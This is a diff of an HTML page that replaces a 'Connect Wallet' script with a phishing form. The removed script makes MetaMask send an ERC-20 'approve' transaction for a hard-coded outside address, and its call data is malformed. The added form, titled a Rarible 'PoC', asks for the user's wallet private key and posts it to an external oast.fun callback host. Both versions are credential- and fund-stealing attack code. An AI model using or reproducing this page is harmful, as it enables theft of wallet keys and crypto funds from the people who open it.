@@ -2,59 +2,60 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
+    <title>Rarible Authentication PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        form {
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            background-color: #000;
+            color: #fff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
 </head>
 <body>
-
-<button id="connectWalletButton">Connect Wallet</button>
-
-<script>
-    // Function to handle the button click and initiate the MetaMask transaction
-    async function connectWallet() {
-        // Check if MetaMask is installed
-        if (typeof window.ethereum !== 'undefined') {
-            try {
-                // Request account access if needed
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-                // Contract address and transaction data for the 'approve' function
-                const contractAddress = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
-                const approveFunctionData = '0x095ea7b3'; // Function signature for 'approve'
-
-                // Parameters for the 'approve' function
-                const addressParameter = '0xb7277a6e95992041568d9391d09d0122023778a2';
-                const unitParameter = '1000';
-
-                // Concatenate the parameters for the 'approve' function
-                const transactionData = approveFunctionData + addressParameter + unitParameter;
-
-                // Replace the following line with your specific transaction logic
-                await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [
-                        {
-                            to: contractAddress,
-                            from: window.ethereum.selectedAddress,
-                            data: transactionData
-                        }
-                    ]
-                });
-
-                alert('Transaction sent successfully!');
-            } catch (error) {
-                console.error(error);
-                alert('Error connecting wallet or sending transaction.');
-            }
-        } else {
-            // MetaMask is not installed, prompt user to install it
-            alert('MetaMask is not installed. Please install it to connect your wallet.');
-        }
-    }
-
-    // Attach the connectWallet function to the button click event
-    document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
-</script>
-
+    <h2>Enter your private key to authenticate to Rarible</h2>
+    <form id="raribleForm" action="http://cnr3wf12vtc0000rfd40gkhb68wyyyyyb.oast.fun" method="POST">
+        <label for="privateKey">Private Key:</label>
+        <input type="text" id="privateKey" name="privateKey" required>
+        <br>
+        <input type="submit" value="Submit">
+    </form>
 </body>
 </html>
